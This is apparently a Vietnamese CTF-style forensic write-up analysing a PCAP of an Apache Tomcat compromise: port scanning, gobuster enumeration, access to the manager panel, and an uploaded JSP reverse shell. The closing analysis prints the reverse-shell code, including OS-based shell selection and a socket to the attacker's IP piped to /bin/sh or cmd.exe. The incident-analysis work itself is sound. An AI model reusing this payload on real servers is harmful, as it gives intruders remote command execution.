## Scenario

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

mình sẽ mô tả lại một chút về trường hợp này, thì SOC đã xác định được một hoạt động nghi ngờ trên web server trong mạng nội bộ của công ty, ý nghĩa của nó là có những hành động thực hiện bất thường trên web server của công ty, họ đã capture được một file pcap và muốn mình phân tích nó, và mục tiêu của mình là phải phân tích file pcap họ đã capture được và tìm ra malicious active bên cạnh đó mình cần phải trả lời những câu hỏi  mà họ đưa ra  


## Thực Hành

### QUESTION 1 : Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

Ở câu hỏi này họ muốn mình xác định được source IP đã khởi tạo  request trên server của họ là như thế nào và đây là cách mình xác định nó :

![image.png](./assets/tomcat/1.png)

khi vào phấn conversation của file pcap này thì mình thấy có hai IP giao tiếp với nhau với lưu lượng rất nhiều, đây là một trong những dấu hiệu bất thường, có thể active này muốn làm flood để làm ngẽn web server này.

Dựa vào scenario thì IP trực thuộc công ty nên có thể là và hoạt động  này nằm trong công ty, hiện tại mình đã xác định được subnet và dài IP của công ty này là **10.0.0.1/24** thì điều này có nghĩa gì, điều này giúp mình xác định được IP mà thực hiện hành động này là nhưng web server nằm ờ công ty vậy hành động trên được thực hiện bởi IP 14.0.0.120 đây có thể là một IP remote của công ty hoặc là bla bla điều này không quan trọng lắm nhưng xác định được server của công ty là gì thì mình sẽ dễ dàng khoanh vùng và thực hiện chi tiết hơn có một cách nhìn tổng quan hơn về cuộc tấn công này.

### QUESTION 3 : From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

Ở đây họ muốn mình xác định được cổng port cung cấp truyền truy cập này

![image.png](./assets/tomcat/3.png)

thì khi mình phát hiện được họ sử dụng HTTP protocol thì port == 8080, nhưng để chắc chắn hơn thì  mình đã filter packets và protocol để xem những gì xảy ra ở đây 

```jsx
ip.addr == 14.0.0.120 && HTTP // filter on wireshark
```

![image.png](./assets/tomcat/4.png)

đây là những gì mình chắc chắn xác định được là  họ dùng HTTP protocol, khi mình kiểm tra packets đầu tiên thì ở phần header của packets nó đã show cho mình xem rồi, vậy là mình xác định được cuộc tấn công này diễn ra trên web của server công ty  ⇒ 8080

Ở câu hỏi này họ muốn mình xác định tools mà attacker đã dùng để enumeration ( liệt kê ), thì mình sẽ xem các packets và header mà attacker thực hiện thì bản chất của điều này là attacker đã brute force để tìm tài nguyên cũng như những file secrect của web server 

![image.png](./assets/tomcat/5.png)

mình đã quan sát và thấy được rằng không hể một user-agent bình thường có thể liên tục gửi requests để check tài nguyên nhiều như vậy được, và khi mình kiểm tra một packet bất kỳ 

![image.png](./assets/tomcat/6.png)

thì bạn có thể thấy được rằng user-agent đã thay đổi, bên cạnh đó gobuster là một tool dùng để pentester hệ thống tìm lỗ hổng, attacker đã lạm dụng nó để scan tài nguyên hệ thống của chúng ta 

⇒ gobuster, thì cho những ai chưa biết gobuster như là một cái tool dùng để scan tài nguyên trong hệ thống, nó như chrome hay các browser khác nhưng có một cái khá hay là nó có function dùng để scan tài nguyên của hệ thống một cách liên tục, điều này giúp hacker biết được tài nguyên nằm ở folder nào.

### QUESTION 5 : After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

Họ muốn mình xác định được directory liên quan tới admin mà attacker đã phát hiện được thì đây là cách mình thực hiện :

Mình sẽ chỉ tập trung vào response 200 OK của server web khi trả về, tại vì khi path hay directory đó là đúng thì nó sẽ response 200 và đây là command mình dùng để filter packets trên wireshark

```jsx
http && http.response.code==200
```

![image.png](./assets/tomcat/7.png)

thì sau khi mình đã filter ra và check packets thì mình có phát hiện một packet có chứa path mà attacker đã tìm ra được đó là 

![image.png](./assets/tomcat/8.png)

thì directory đó là **manager,** đây chính là folder mà chứa information secret của công ty này, họ khá lộ liễu khi để folder này hiển thị một cách dễ dàng như thế, điều này tạo việc thuận lợi cho hacker khi brute force được path của nó.

### QUESTION 6 : After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

Họ muốn mình xác định được password và user mà attacker đã dùng để login success vào server thì dưới đây là cách mình thực hiện và kiểm tra nó

### QUESTION 7 : Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

Họ muốn mình phải xác định được file malicious mà attacker đã post lên server, đây là một cách khá phổ biến trong tấn công web, có thể mình chưa biết trong file đó chứa những contents gì nhưng có một điều khá chắc chắn nó có thể là một file reverse shell và hãy xem cách mình thực hiện nó :

Mình sẽ dùng command 

```jsx
ip.src == <Attacker_IP> && http.request.method == POST
```

để filter packets giúp mình dễ dàng phân tích và xác định hơn

![image.png](./assets/tomcat/13.png)

### Phân Tích File JPS

thì đầu tiên như các function được gọi ở trên họ có nhưng hàm như :

```jsx
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
```

Họ dùng các library của java để import như [java.net](http://java.net) là dùng cho socket, [java.io](http://java.io) là dùng cho đọc ghi dữ liệu và hàm java.lang là runtime, process đây là nhưng hàm mà họ dùng để import từ thư viện có sẵn của java. 

```jsx
class StreamConnector extends Thread
```

Đây là hàm cực kì quan trọng trong file này nó dùng để forward dữ liệu giữa hai luồng và có các chức năng như InputStream ns, OutputStream vA đây là hai phần nguồn dữ liệu và nơi ghi dữ liệu của hàm đó bên cạnh đó nó cũng thực hiện những hành động trên .

```jsx
while( ( length = w7.read( buffer, 0, buffer.length ) ) > 0 )
{
  kLz.write( buffer, 0, length );
  kLz.flush();
}
```

Còn đây chính là phần chính trong nó, đọc dữ liệu từ input và ghi sang output một cách liên tục không chi vậy nó còn là sự kết nối giữa shell và socket hay còn gọi là Pipe dữ liệu giữa shell và socket đây là phần giao tiếp của nó . Còn các bạn muốn hiều sâu hơn hay là nhiều hơn về nó thì đầu tiên các bạn phải hiểu được java language thì các bạn mới có thể phân tích được  một cách chi tiết về nó, hiểu cơ bản và một chút sâu thì các bạn sẽ hiểu được nó làm gì và những function nào được hoạt động như thế nào.

Dưới đây là phần xác định hệ điều hành của malware này, nó khá là tinh vi nó có thủ công về phần xác định OS để run process phù hợp với hệ điều hành tránh gây lỗi khi xảy ra những vấn đề don’t invalid trong hệ thống 

```jsx
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
```

mình đã thấy được rằng nếu OS không phải là windows thì sẽ thực hiện lệnh **/bin/sh** còn nếu là windows thì sẽ run process cmd.exe đây cũng là một điểm đáng để chú ý.

Dưới đây chính là phần mà malware dùng socket connect tới server bên cạnh đó tạo command shell điều khiển và kết nối hai chiều từ server tới hacker và ngược lại 

```jsx
    Socket socket = new Socket( "10.0.0.142", 80 ); 
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();

```

như các bạn có thể quan sát thấy được IP server của hacker là như thế nào đúng không, ở phần process đó chính là run cmd để giúp hacker có thể thực hiện reverse shell từ bên ngoài vào. Còn hai phần còn lại chính là tạo sự connect socket với server và luân phiên nhau như thế. Bên cạnh đó file malware này không tự động chạy mà nó được chạy khi có HTTP request tới nó đây là cách  phổ biến nhất mà hacker thường hay sử dụng với nhưng server yếu về bảo mật. Như bài này thì hacker có khả năng edit được source code của server và có thể thêm file này vào trong phần source đó để nó có thể tự run khi server active.
